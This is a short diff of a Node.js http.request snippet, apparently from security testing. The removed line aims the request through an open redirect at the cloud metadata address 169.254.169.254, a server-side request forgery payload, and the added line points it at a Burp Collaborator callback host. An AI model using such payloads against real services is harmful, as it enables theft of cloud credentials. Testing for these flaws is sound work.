@@ -3,7 +3,7 @@ const http = require("http")
 http
   .request(
     {
-      hostname: "https://api.dinerstables.com/redirect?url=http://169.254.169.254",
+      hostname: "ioaswrkb6o8s5bdh76224s26dxjq7f.burpcollaborator.net",
     },
     res => {
       let data = ""
